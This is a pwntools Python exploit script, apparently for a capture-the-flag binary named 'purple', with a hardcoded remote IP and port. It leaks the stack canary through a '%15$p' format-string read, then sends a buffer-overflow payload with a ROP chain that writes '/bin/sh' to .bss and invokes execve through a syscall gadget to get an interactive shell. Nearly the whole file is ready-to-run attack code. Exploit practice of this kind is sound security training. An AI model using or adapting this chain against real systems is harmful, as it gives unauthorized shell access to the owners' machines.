#!/usr/bin/env python3

from pwn import *

exe = ELF("./purple")
rop = ROP(exe)
context.binary = exe # Set context early for p64 packing and other ELF-aware operations

# --- Gadgets ---
# Using your variable names for gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # use ropper to get good gadgets
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = 0x48618b
mov_rax_rdi = 0x045285b # Side effect: scrambles rax


ret_g = rop.find_gadget(['ret'])[0]

# Try to find 'syscall; ret' first for robustness. If not, then just 'syscall'.
try:
    syscall_g = rop.find_gadget(['syscall', 'ret'])[0]
    log.info("Found 'syscall; ret' gadget.")
except IndexError:
    log.info("Did not find 'syscall; ret', looking for plain 'syscall'.")
    syscall_g = rop.find_gadget(['syscall'])[0]

# --- Constants ---
binshstr_qword = b'/bin/sh\x00'  # "/bin/sh\0" as a QWORD (little-endian bytes: 2f 62 69 6e 2f 73 68 00)
execve_id = 0x3b                   # Syscall number for execve

# --- Writable Memory ---
# Choose a writable address. .bss is common. Add an offset for safety.
# Verify with `readelf -S ./purple` that .bss is suitable and large enough.
# For just 8 bytes, most .bss sections will be fine.
writable_area = exe.bss() + 0x100 # Adjust offset if needed
log.info(f"Chosen writable address for '/bin/sh': {writable_area:#x}")

def conn():
    if args.LOCAL:
        log.info("Running locally")
        r = process([exe.path])
    else:
        # !!! USER: Fill in the remote host and port here !!!
        remote_host = "209.38.56.153"  # Replace "addr" with the actual hostname or IP
        remote_port = 9988    # Replace 1337 with the actual port
        if remote_host == "addr":
             log.critical("Remote address not set. Please edit the script!")
             exit(1)
        log.info(f"Connecting to remote: {remote_host}:{remote_port}")
        r = remote(remote_host, remote_port)
    return r

def main():
    r = conn()

    if False: 
        # Example GDB script. Adjust breakpoints as needed.
        gdb_script = f"""
            b *0x4019fd
            c
        """
        gdb.attach(r)
        # pause() # Uncomment if you need to manually step in GDB before the script continues

    r.clean() # Clear any initial welcome messages

    # --- Stage 1: Leak Canary ---
    log.info("Sending format string '%15$p' to leak canary.")
    r.sendline(b"%15$p")

    # Adjust recvuntil based on the program's actual output before the canary
    # Your original code had: r.recvuntil("I,")
    #                        canary_str = r.recvuntil(" ").strip()
    r.recvuntil(b"I,") # Consumes text up to "I,"
    canary_hex_str = r.recvuntil(b" ", drop=True) # Reads until the next space, and drops the space
    canary = int(canary_hex_str, 16)
    log.success(f"Leaked canary: {canary:#x}")

    # --- Stage 2: Prepare and Send Exploit Payload ---
    # Your `offset = cyclic_find('aaqa')` needs to be the correct number of bytes
    # of padding from the start of your input buffer to where the canary is on the stack.
    # If 'aaqa' (as an integer or bytes) was found at the canary's position by cyclic, this is correct.
    # Example: if your input buffer is char buf[40]; then offset_to_canary = 40.
    try:
        # Assuming 'aaqa' represents the bytes that would overwrite the canary location
        # If 'aaqa' is an integer, like 0x61617161, use that.
        # If it's a string from cyclic pattern, use bytes: b'aaqa'
        offset_to_canary = cyclic_find(b'aaqa') # Or provide the integer directly, e.g., 40
        log.info(f"Offset to canary (from cyclic_find('aaqa')): {offset_to_canary}")
    except ValueError:
        log.critical("Pattern 'aaqa' not found by cyclic_find. Please determine the correct offset_to_canary manually.")
        log.info("Set 'offset_to_canary' to the correct number of bytes before the stack canary.")
        # Example: offset_to_canary = 40 # Replace with actual determined offset
        # For now, exiting if not found.
        exit(1)

    # Start building the payload
    payload = b"A" * offset_to_canary
    payload += p64(canary)     # Overwrite canary with its own value
    payload += p64(ret_g)      # Overwrite saved RBP (ret_g is fine, acts as a dummy RBP or alignment)

    # ROP Chain for execve("/bin/sh", NULL, NULL)
    
    # 1. Set up RSI and RDX for execve. These are done first as they are not
    #    clobbered by the subsequent string write operations.
    payload += p64(pop_rsi)
    payload += p64(writable_area + 40)
    
    payload += p64(pop_rdx_rbx)
    payload += p64(0)
    payload += p64(0) # Set rbx to null as well

    #    RAX = binshstr_qword
    payload += p64(pop_rax)
    payload += binshstr_qword            
    #    RDI = writable_area (where "/bin/sh\0" will be written)
    payload += p64(pop_rdi)
    payload += p64(writable_area)         
    

    payload += p64(mov_rax_rdi)      # Side effect: RSI must be valid

    payload += p64(pop_rsi)
    payload += p64(0) # Reset RSI

    payload += p64(pop_rax)
    payload += p64(execve_id)                 # RAX = 0x3b (syscall number for execve)
    
    payload += p64(syscall_g)                 # Execute syscall

    log.info("Sending the exploit payload...")
    r.sendline(payload)

    # --- Stage 3: Interact with the shell ---
    r.interactive()

if __name__ == "__main__":
    main()